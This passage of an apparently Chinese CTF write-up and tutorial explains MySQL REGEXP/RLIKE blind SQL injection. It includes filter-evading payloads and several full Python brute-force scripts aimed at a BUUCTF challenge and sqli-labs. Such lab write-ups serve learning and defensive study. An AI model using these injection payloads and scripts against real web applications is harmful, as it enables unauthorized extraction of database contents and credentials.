<span class="hljs-operator">|</span> <span class="hljs-string">'abcd'</span> <span class="hljs-keyword">like</span> <span class="hljs-string">'a'</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------+</span>
<span class="hljs-operator">|</span>               <span class="hljs-number">0</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------+</span>
<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.04</span> sec)

mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-string">'abcd'</span> rlike <span class="hljs-string">'a'</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">------------------+</span>
<span class="hljs-operator">|</span> <span class="hljs-string">'abcd'</span> rlike <span class="hljs-string">'a'</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">------------------+</span>
<span class="hljs-operator">|</span>                <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">------------------+</span>
<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.03</span> sec)

mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-string">'abcd'</span> regexp <span class="hljs-string">'a'</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span>
<span class="hljs-operator">|</span> <span class="hljs-string">'abcd'</span> regexp <span class="hljs-string">'a'</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span>
<span class="hljs-operator">|</span>                 <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span>
<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.04</span> sec)</code></pre>
<p>（好好好，又得学习一波regexp注入了~~~~）</p>
<pre><code class="hljs sql">if($this<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>conn<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>error){    <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 如果<span class="hljs-keyword">sql</span>语句报错就返回error
    <span class="hljs-keyword">return</span> <span class="hljs-string">'error'</span>;
}</code></pre>
<p>如果 sql 语句出现错误便返回字符串 “error”，然后进入到 login.php 中就会返回 error。根据这里的特性，如果我们可以控制这里的报错的话，便可以进行盲注。</p>
<p>但是怎么构造呢？在网上的看到了大佬的思路是真的巧妙：</p>
<pre><code class="hljs sql"><span class="hljs-operator">||</span><span class="hljs-built_in">exp</span>(<span class="hljs-number">710</span><span class="hljs-operator">-</span>(... rlike ...))</code></pre>
<p>即如果 <code>(... rlike ...)</code> 中的语句执行匹配后的结果为True，经过减号转换后为 <code>exp(710-1)</code> 后不会溢出；若为false，转换为 <code>exp(710-0)</code> 后则会溢出并报错。</p>
<p>大致的 payload 如下：</p>
<pre><code class="hljs sql"><span class="hljs-string">'username'</span>: <span class="hljs-string">'admin\'</span>,
<span class="hljs-string">'password'</span>: <span class="hljs-string">'||exp(710-(code rlike binary {0}))#'</span>,
<span class="hljs-string">'code'</span>: <span class="hljs-string">'1'</span></code></pre>
<p>对于上述payload的解释（GPT）：</p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> database()) regexp <span class="hljs-type">binary</span> <span class="hljs-string">'^sec'</span></code></pre>
<p>例子如上，解释如下，大概binary关键字就是用来区分大小写的吧</p>
<pre><code class="hljs plaintext">这段 SQL 语句可以分为两部分，让我一步一步解释：

1. `(select database())`：这部分执行一个子查询，获取当前数据库的名称。

2. `regexp binary '^sec'`：这部分使用正则表达式进行匹配，并且使用 `binary` 进行二进制比较。

    - `regexp` 是 MySQL 中用于执行正则表达式匹配的操作符。
    
    - `binary` 是一个修饰符，用于表示要进行二进制比较。在这个上下文中，它确保正则表达式的匹配是对字节进行精确匹配，而不考虑字符的大小写或编码。

    - `'^sec'` 是一个正则表达式模式，表示以 "sec" 开头的字符串。

综合起来，整个 SQL 语句的含义是：检查当前数据库的名称是否以 "sec" 开头。如果匹配成功，查询将返回 1，表示真（true）；否则，返回 0，表示假（false）。</code></pre>
<p>但这里题目过滤了引号，所以我们rlike无法直接引入%和^。按照之前的regexp注入操作我们可以将^连同后面的待猜测字符一块做Hex编码，之后进入数据库中MySQL会自动将16进制编码的字符转为对应的字符串</p>
<pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">str2hex</span>(<span class="hljs-params">string</span>):  <span class="hljs-comment"># 转换16进制,16进制在数据库执行查询时又默认转换成字符串</span>
    result = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:
        result += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))
    result = result.replace(<span class="hljs-string">'0x'</span>, <span class="hljs-string">''</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">'0x'</span> + result

......

passwd = str2hex(<span class="hljs-string">'^'</span> + name + j)
payloads = payload.<span class="hljs-built_in">format</span>(passwd).replace(<span class="hljs-string">' '</span>,<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0c</span>))
postdata = {
    <span class="hljs-string">'username'</span>: <span class="hljs-string">'admin\\'</span>,
    <span class="hljs-string">'password'</span>: payloads,
    <span class="hljs-string">'code'</span>: <span class="hljs-string">'1'</span>
}</code></pre>
<p>题目还限制了 password 位置匹配的字符串长度，最长只能匹配 4 个字符，如果超过了 4 个则会返回 Huge num detected 错误（但我不知道为何师傅们都说最多只能4个字符，我看着正则当中是数字9，不应该是9个字符吗。。不理解）。</p>
<p>接着我幸运地找到了一个解释：</p>
<pre><code class="hljs plaintext">同时num_waf 有个判断十六进制位数不能超过9位，既字符串不能超过4位(一个字母对应2个十六进制数)，所以在包含正则^以外的字符串超过3位时需要不断做替换，用3位字符串去匹配下一位</code></pre>
<p>那这样的话我们便不能在 payload 里面使用 <code>^</code> 了，也就没有办法在正则表达式中确定首位的位置，我们只能知道有这么几个连续的字符，就像下面这样：</p>
<pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-string">'flag{abcdefghijklmnopqrstuvwxyz}'</span> rlike <span class="hljs-string">'ab'</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------+</span>
<span class="hljs-operator">|</span> <span class="hljs-string">'flag{abcdefghijklmnopqrstuvwxyz}'</span> rlike <span class="hljs-string">'ab'</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------+</span>
<span class="hljs-operator">|</span>                                             <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------+</span>
<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.04</span> sec)

mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-string">'flag{abcdefghijklmnopqrstuvwxyz}'</span> rlike <span class="hljs-string">'lag{'</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------------------------+</span>
<span class="hljs-operator">|</span> <span class="hljs-string">'flag{abcdefghijklmnopqrstuvwxyz}'</span> rlike <span class="hljs-string">'lag{'</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------------------------+</span>
<span class="hljs-operator">|</span>                                               <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------------------------+</span>
<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.03</span> sec)</code></pre>
<p>师傅的爆破思路：先爆破出前三位来，然后再通过前 3 位爆第4位，再通过第2、3、4位爆第5位…</p>
<p>编写如下脚本进行爆破：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> string

<span class="hljs-keyword">def</span> <span class="hljs-title function_">str2hex</span>(<span class="hljs-params">string</span>):  <span class="hljs-comment"># 转换16进制,16进制在数据库执行查询时又默认转换成字符串</span>
    result = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:
        result += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))
    result = result.replace(<span class="hljs-string">'0x'</span>, <span class="hljs-string">''</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">'0x'</span> + result

strs = string.ascii_letters + string.digits + <span class="hljs-string">'_'</span>
url = <span class="hljs-string">"http://690399e6-ab28-459d-ab40-789da08843fb.node4.buuoj.cn:81/login.php"</span>
headers = {
    <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0'</span>
}
payload = <span class="hljs-string">'||exp(710-(code rlike binary {0}))#'</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    name = <span class="hljs-string">''</span>
    z = <span class="hljs-number">3</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:
            passwd = str2hex(name + j)
            payloads = payload.<span class="hljs-built_in">format</span>(passwd).replace(<span class="hljs-string">' '</span>,<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0c</span>))<span class="hljs-comment">#0x0c代替空格</span>
            postdata = {
                <span class="hljs-string">'username'</span>: <span class="hljs-string">'admin\\'</span>,
                <span class="hljs-string">'password'</span>: payloads,
                <span class="hljs-string">'code'</span>: <span class="hljs-string">'1'</span>
            }
            r = requests.post(url, data=postdata, headers=headers, allow_redirects=<span class="hljs-literal">False</span>)
            <span class="hljs-comment">#print(r.text)</span>
            <span class="hljs-keyword">if</span> <span class="hljs-string">"fail"</span> <span class="hljs-keyword">in</span> r.text:
                name += j
                <span class="hljs-built_in">print</span>(j, end=<span class="hljs-string">''</span>)
                <span class="hljs-keyword">break</span>

        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(name) &gt;= <span class="hljs-number">3</span>:
            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):
                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:
                    passwd = str2hex(name[z - <span class="hljs-number">3</span>:z] + j)  <span class="hljs-comment"># ergh</span>
                    payloads = payload.<span class="hljs-built_in">format</span>(passwd).replace(<span class="hljs-string">' '</span>, <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0c</span>))
                    postdata = {
                        <span class="hljs-string">'username'</span>: <span class="hljs-string">'admin\\'</span>,
                        <span class="hljs-string">'password'</span>: payloads,
                        <span class="hljs-string">'code'</span>: <span class="hljs-string">'1'</span>
                    }
                    r = requests.post(url, data=postdata, headers=headers, allow_redirects=<span class="hljs-literal">False</span>)
                    <span class="hljs-comment"># print(r.text)</span>
                    <span class="hljs-keyword">if</span> <span class="hljs-string">"fail"</span> <span class="hljs-keyword">in</span> r.text:
                        name += j
                        <span class="hljs-built_in">print</span>(j, end=<span class="hljs-string">''</span>)
                        z += <span class="hljs-number">1</span>
                        <span class="hljs-keyword">break</span></code></pre>
<p>出结果了，别高兴的太早，因为这里陷入了一个死循环当中：</p>
<pre><code class="hljs plaintext">erghruigh2uygh2uygh2uygh2uygh2uygh2uygh2uygh2uygh2uygh2uygh......</code></pre>
<p>可以看到爆出 <code>erghruigh2</code> 之后不停地循环出现 <code>uygh2</code>，所以我们可以推测出真正的 code 里面有两个 <code>gh2</code>，其中位于前面的那个 <code>gh2</code> 后面紧跟着一个 <code>u</code>，即 <code>gh2u</code>。后面那个 <code>gh2</code> 后面跟的是那个字符我们还不能确定，那我们便可以测试一下除了 <code>u</code> 以外的其他字符，经测试第二个 <code>gh2</code> 后面跟的字符是 <code>3</code>，即 <code>gh23</code>，然后继续根据 <code>h23</code> 爆破接下来的字符就行了，最后得到的 code 如下：</p>
<pre><code class="hljs plaintext">erghruigh2uygh23uiu32ig</code></pre>
<p>不过这里我也是想不通最后这个死循环的解决原理。。。</p>
<p>然后直接登陆即可得到 flag：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215200129931.png" alt="image-20231215200129931"></p>
<p>接着我又找了几篇wp发现有位师傅直接从最后一个字符开始匹配，用到了$正则：</p>
<pre><code class="hljs plaintext">$ 是一个用于锚定模式结尾位置的元字符，用于确保匹配发生在输入字符串的末尾。</code></pre>
<p>这样就不会有上述重复的问题，但是也要配合从第一位开始爆破的脚本，这样两者对比才可正确得出</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> string

<span class="hljs-keyword">def</span> <span class="hljs-title function_">str2hex</span>(<span class="hljs-params">string</span>):  <span class="hljs-comment"># 转换16进制,16进制在数据库执行查询时又默认转换成字符串</span>
    result = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:
        result += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))
    result = result.replace(<span class="hljs-string">'0x'</span>, <span class="hljs-string">''</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">'0x'</span> + result

strs = string.ascii_letters + string.digits + <span class="hljs-string">'_'</span>
url = <span class="hljs-string">"http://690399e6-ab28-459d-ab40-789da08843fb.node4.buuoj.cn:81/login.php"</span>
headers = {
    <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0'</span>
}
payload = <span class="hljs-string">'||exp(710-(code rlike binary {0}))#'</span>
tmp = <span class="hljs-string">'$'</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    name = <span class="hljs-string">''</span>
    z = <span class="hljs-number">3</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:
            passwd = str2hex(j + tmp)
            payloads = payload.<span class="hljs-built_in">format</span>(passwd).replace(<span class="hljs-string">' '</span>,<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0c</span>))
            postdata = {
                <span class="hljs-string">'username'</span>: <span class="hljs-string">'admin\\'</span>,
                <span class="hljs-string">'password'</span>: payloads,
                <span class="hljs-string">'code'</span>: <span class="hljs-string">'1'</span>
            }
            r = requests.post(url, data=postdata, headers=headers, allow_redirects=<span class="hljs-literal">False</span>)
            <span class="hljs-comment">#print(r.text)</span>
            <span class="hljs-keyword">if</span> <span class="hljs-string">"fail"</span> <span class="hljs-keyword">in</span> r.text:
                name += j
                <span class="hljs-built_in">print</span>(j + tmp, name)
                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp) == <span class="hljs-number">3</span>:
                    tmp = j + tmp[:-<span class="hljs-number">1</span>]
                <span class="hljs-keyword">else</span>:
                    tmp = j + tmp
                <span class="hljs-keyword">break</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215200406827.png" alt="image-20231215200406827"></p>
<p>如上图，最后简单反转一下字符串即可</p>
<p>最后会有如下：</p>
<pre><code class="hljs plaintext">erghruigh2uygh2uygh2uygh2uygh2
erghruigh23uiu32ig</code></pre>
<p>我们两者对比得到<code>erghruigh2uygh23uiu32ig</code></p>
<p>只能说脚本对我来说好难。。。接下来就是跟着编写脚本的时候了</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> string

<span class="hljs-keyword">def</span> <span class="hljs-title function_">str2hex</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):
    result = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:
        result += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))
    result = result.replace(<span class="hljs-string">'0x'</span>, <span class="hljs-string">''</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">'0x'</span> + result

strs = string.ascii_letters + string.digits + <span class="hljs-string">'_'</span>
url = <span class="hljs-string">'http://690399e6-ab28-459d-ab40-789da08843fb.node4.buuoj.cn:81/login.php'</span>
headers = {
    <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0'</span>
}

payload = <span class="hljs-string">'||exp(710-(code rlike binary {0}))#'</span>
tmp = <span class="hljs-string">'^'</span>
name = <span class="hljs-string">''</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:
        passwd = str2hex(tmp + j)
        payloads = payload.<span class="hljs-built_in">format</span>(passwd).replace(<span class="hljs-string">' '</span>, <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0c</span>))
        data = {
            <span class="hljs-string">'username'</span>: <span class="hljs-string">'\\'</span>,
            <span class="hljs-string">'password'</span>: payloads,
            <span class="hljs-string">'code'</span>: <span class="hljs-string">'1'</span>
        }
        req = requests.post(url, data = data, allow_redirects=<span class="hljs-literal">False</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-string">'fail'</span> <span class="hljs-keyword">in</span> req.text:
            name += j
            <span class="hljs-built_in">print</span>(tmp + j, name)
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp) == <span class="hljs-number">3</span>:
                tmp = tmp[<span class="hljs-number">1</span>:] + j
            <span class="hljs-keyword">else</span>:
                tmp += j
            <span class="hljs-keyword">break</span>

tmp = <span class="hljs-string">'$'</span>
name = <span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:
        passwd = str2hex(j + tmp)
        payloads = payload.<span class="hljs-built_in">format</span>(passwd).replace(<span class="hljs-string">' '</span>, <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0c</span>))
        data = {
            <span class="hljs-string">'username'</span>: <span class="hljs-string">'\\'</span>,
            <span class="hljs-string">'password'</span>: payloads,
            <span class="hljs-string">'code'</span>: <span class="hljs-string">'1'</span>
        }
        req = requests.post(url, data = data, allow_redirects=<span class="hljs-literal">False</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-string">'fail'</span> <span class="hljs-keyword">in</span> req.text:
            name = j + name
            <span class="hljs-built_in">print</span>(j + tmp, name)
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp) == <span class="hljs-number">3</span>:
                tmp = j + tmp[:-<span class="hljs-number">1</span>]
            <span class="hljs-keyword">else</span>:
                tmp = j + tmp
            <span class="hljs-keyword">break</span>

data = {
            <span class="hljs-string">'username'</span>: <span class="hljs-string">'\\'</span>,
            <span class="hljs-string">'password'</span>: <span class="hljs-string">'||1#'</span>,
            <span class="hljs-string">'code'</span>: <span class="hljs-string">'erghruigh2uygh23uiu32ig'</span>
        }

req = requests.post(url, data=data)
<span class="hljs-built_in">print</span>(req.text)</code></pre>
<p>完整代码如上，不过我自己在编写完成后，发现从后面开始匹配的方法，有一定几率一次成功。</p>
<h1 id="0x04-regexp与like注入">0x04 REGEXP与LIKE注入</h1>
<p>这里质量低下，知识点基本都是照搬的，有的只是自己的思考和实操罢了</p>
<h2 id="regexp注入分析">REGEXP注入分析</h2>
<p><strong>注入原理</strong></p>
<p>REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。</p>
<h3 id="1-基本注入">1、基本注入</h3>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span>语句) regexp <span class="hljs-string">'正则'</span></code></pre>
<p>正常的查询语句：</p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;</code></pre>
<p>（1）正则注入，若匹配则返回1，不匹配返回0</p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>) regexp <span class="hljs-string">'^a'</span>;</code></pre>
<pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">----------+</span>
<span class="hljs-operator">|</span> username <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----------+</span>
<span class="hljs-operator">|</span> Dumb     <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----------+</span>
<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.11</span> sec)

mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span>(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>) regexp <span class="hljs-string">'^D'</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------+</span>
<span class="hljs-operator">|</span> (<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>) regexp <span class="hljs-string">'^D'</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------+</span>
<span class="hljs-operator">|</span>                                                   <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------+</span>
<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.04</span> sec)

mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span>(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>) regexp <span class="hljs-string">'^a'</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------+</span>
<span class="hljs-operator">|</span> (<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>) regexp <span class="hljs-string">'^a'</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------+</span>
<span class="hljs-operator">|</span>                                                   <span class="hljs-number">0</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------+</span>
<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.04</span> sec)</code></pre>
<p><code>^</code>表示pattern(模式串)的开头。即若匹配到username字段下id=1的数据开头为a，则返回1；否则返回0</p>
<p>（2）regexp关键字还可以代替where条件里的=号</p>
<pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">----------+</span>
<span class="hljs-operator">|</span> password <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----------+</span>
<span class="hljs-operator">|</span> Dumb     <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----------+</span>
<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.05</span> sec)

mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> password regexp <span class="hljs-string">'^Du'</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span>
<span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> username <span class="hljs-operator">|</span> password <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span>
<span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Dumb     <span class="hljs-operator">|</span> Dumb     <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-number">12</span> <span class="hljs-operator">|</span> dhakkan  <span class="hljs-operator">|</span> dumbo    <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span>
<span class="hljs-number">2</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.04</span> sec)</code></pre>
<p>使用场景：</p>
<blockquote>
<p>过滤了=、in、like</p>
</blockquote>
<p><code>^</code>若被过滤，可使用<code>$</code>来从后往前进行匹配（深有感悟啊~~），常用regexp正则语句：</p>
<pre><code class="hljs sql">regexp <span class="hljs-string">'^[a-z]'</span>  #判断一个表的第一个字符串是否在a<span class="hljs-operator">-</span>z中
regexp <span class="hljs-string">'^r'</span>      #判断第一个字符串是否为r
regexp <span class="hljs-string">'^r[a-z]'</span> #判断一个表的第二个字符串是否在a<span class="hljs-operator">-</span>z中</code></pre>
<p>（3）在联合查询中的使用</p>
<pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database() regexp <span class="hljs-string">'^s'</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215205452658.png" alt="image-20231215205452658"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215205541822.png" alt="image-20231215205541822"></p>
<p>上述password处只会显示1或者0，这样就能知道我们的regexp是否匹配成功。</p>
<h3 id="2-regexp盲注">2、REGEXP盲注</h3>
<p>在sqli-labs靶场Less-8关进行测试</p>
<p><strong>1.判断数据库长度</strong></p>
<pre><code class="hljs sql"><span class="hljs-string">' or (length(database())=8)--+ 正常</span></code></pre>
<p><strong>2.判断数据库名</strong></p>
<pre><code class="hljs sql"><span class="hljs-string">' or database() regexp '</span><span class="hljs-operator">^</span>s<span class="hljs-string">'--+ 正常</span>
<span class="hljs-string">'</span> <span class="hljs-keyword">or</span> database() regexp <span class="hljs-string">'y$'</span><span class="hljs-comment">--+ 正常</span></code></pre>
<p>表名、字段名、数据内容不再赘述。很明显和普通的布尔盲注差不多，附上大师傅的脚本：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> string

strs = string.printable
url = <span class="hljs-string">"http://x.x.x.x:8001/Less-8/index.php?id="</span>

database1 = <span class="hljs-string">"' or database() regexp '^{}'--+"</span>
table1 = <span class="hljs-string">"' or (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp '^{}'--+"</span>
